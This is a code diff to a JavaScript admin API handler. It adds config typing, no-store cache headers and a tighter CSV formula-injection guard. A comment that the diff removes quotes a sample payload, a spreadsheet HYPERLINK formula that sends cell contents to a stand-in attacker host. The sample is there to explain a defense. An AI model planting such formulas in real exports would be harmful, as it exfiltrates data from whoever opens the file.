@@ -30,11 +30,28 @@ import { verifyAccess } from "../access.js";
 import { sendOne, sendToAll } from "../lib/mailing.js";
 
 /**
+ * @typedef {{
+ *   table: string,
+ *   reviewedAt?: boolean,
+ *   search?: string[],
+ *   statuses?: string[],
+ *   editable?: Record<string, any>,
+ *   updatedAt?: boolean,
+ *   readOnly?: boolean,
+ *   hasStatus?: boolean,
+ *   hasNotes?: boolean,
+ *   orderBy?: string,
+ *   select?: string[]
+ * }} CollectionConfig
+ */
+
+/**
  * Allowlist of collections that may be listed, updated, or deleted.
  *   `reviewedAt` — carries a `reviewed_at` column (stamped on status change).
  *   `search`     — text columns used by the `q` filter (identifiers only).
  *   `statuses`   — allowed `status` values, when a collection constrains them.
  */
+/** @type {Record<string, CollectionConfig>} */
 const COLLECTIONS = {
   applications: {
     table: "applications",
@@ -151,6 +168,27 @@ const METHODS = "GET, PATCH, DELETE, OPTIONS";
  * @returns {Promise<Response>}
  */
 export async function handleAdmin(request, env, ctx, url) {
+  const resp = await dispatchAdmin(request, env, ctx, url);
+  if (request.method === "OPTIONS") return resp;
+  const headers = new Headers(resp.headers);
+  headers.set("cache-control", "no-store, no-cache, must-revalidate");
+  return new Response(resp.body, {
+    status: resp.status,
+    statusText: resp.statusText,
+    headers,
+  });
+}
+
+/**
+ * Internal dispatcher for `/api/admin/*`.
+ *
+ * @param {Request} request
+ * @param {{DB: D1Database}} env
+ * @param {ExecutionContext} ctx
+ * @param {URL} url
+ * @returns {Promise<Response>}
+ */
+async function dispatchAdmin(request, env, ctx, url) {
   // Answer preflight before auth so browsers get a clean 204. Genuine
   // cross-origin callers get no ACAO header and are blocked by the browser.
   if (request.method === "OPTIONS") {
@@ -324,7 +362,7 @@ async function summary(env) {
  *
  * @param {{DB: D1Database}} env
  * @param {URL} url
- * @param {{table: string, reviewedAt: boolean, search: string[]}} config
+ * @param {CollectionConfig} config
  * @returns {Promise<Response>}
  */
 async function list(env, url, config) {
@@ -370,7 +408,7 @@ async function list(env, url, config) {
 /**
  * Build a parameterised `WHERE` fragment from the optional filters.
  *
- * @param {{search: string[]}} config
+ * @param {CollectionConfig} config
  * @param {{status: string, q: string}} filters
  * @returns {{clauses: string[], binds: unknown[]}}
  */
@@ -383,7 +421,7 @@ function buildFilter(config, { status, q }) {
     binds.push(status);
   }
 
-  if (q && config.search.length) {
+  if (q && config.search && config.search.length) {
     const pattern = likePattern(q);
     clauses.push(
       `(${config.search.map((col) => `${col} LIKE ? ESCAPE '\\'`).join(" OR ")})`,
@@ -412,7 +450,7 @@ function likePattern(value) {
  *
  * @param {Request} request
  * @param {{DB: D1Database}} env
- * @param {{table: string, reviewedAt: boolean, statuses?: string[]}} config
+ * @param {CollectionConfig} config
  * @param {number} id
  * @returns {Promise<Response>}
  */
@@ -522,7 +560,7 @@ async function update(request, env, config, id) {
  *
  * @param {Request} request
  * @param {{DB: D1Database}} env
- * @param {{table: string, reviewedAt: boolean, statuses?: string[]}} config
+ * @param {CollectionConfig} config
  * @returns {Promise<Response>}
  */
 async function bulkStatus(request, env, config) {
@@ -552,6 +590,7 @@ async function bulkStatus(request, env, config) {
 
   const placeholders = ids.map(() => "?").join(", ");
   const sets = ["status = ?"];
+  /** @type {any[]} */
   const binds = [status];
   if (config.reviewedAt) sets.push("reviewed_at = datetime('now')");
   binds.push(...ids);
@@ -569,7 +608,7 @@ async function bulkStatus(request, env, config) {
  * Hard-delete a row.
  *
  * @param {{DB: D1Database}} env
- * @param {{table: string}} config
+ * @param {CollectionConfig} config
  * @param {number} id
  * @returns {Promise<Response>}
  */
@@ -704,7 +743,9 @@ async function exportCsv(env, url) {
     .all();
 
   const rows = results ?? [];
-  const columns = rows.length ? Object.keys(rows[0]) : [];
+  const columns = rows.length
+    ? Object.keys(rows[0])
+    : (config.select || config.search || ["id"]);
   const lines = [columns.join(",")];
   for (const row of rows) {
     lines.push(columns.map((col) => csvCell(row[col])).join(","));
@@ -716,6 +757,7 @@ async function exportCsv(env, url) {
     headers: {
       "content-type": "text/csv; charset=utf-8",
       "content-disposition": `attachment; filename="${config.table}.csv"`,
+      "cache-control": "no-store, no-cache, must-revalidate",
       "x-robots-tag": "noindex",
     },
   });
@@ -724,15 +766,9 @@ async function exportCsv(env, url) {
 /**
  * Encode one CSV cell, quoting when it contains a comma, quote, or newline.
  *
- * CSV-injection guard: a cell whose first character is `=`, `+`, `-`, `@`, TAB,
- * or CR is a formula/command trigger in Excel, Google Sheets, and some BI
- * tools. A public form field like `=HYPERLINK("https://evil.example?x="&A1,"y")`
- * would otherwise execute when a steward opens the export (data exfiltration,
- * and DDE RCE in some Excel builds). Prefixing such a cell with a single quote
- * is the standard mitigation; the quote is applied BEFORE the comma/quote
- * escaping below so it lands inside any surrounding quotes. This is a spooled
- * export, so turning a leading `-`/`+` on a number into text is acceptable and
- * does not break the CSV structure.
+ * CSV-injection guard: a cell whose first character (including after whitespace) is
+ * `=`, `+`, `-`, `@`, TAB, or CR is a formula/command trigger in Excel, Google Sheets,
+ * and some BI tools.
  *
  * @param {unknown} value
  * @returns {string}
@@ -740,6 +776,6 @@ async function exportCsv(env, url) {
 function csvCell(value) {
   if (value === null || value === undefined) return "";
   let s = String(value);
-  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
+  if (/^\s*[=+\-@\t\r]/.test(s)) s = `'${s}`;
   return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
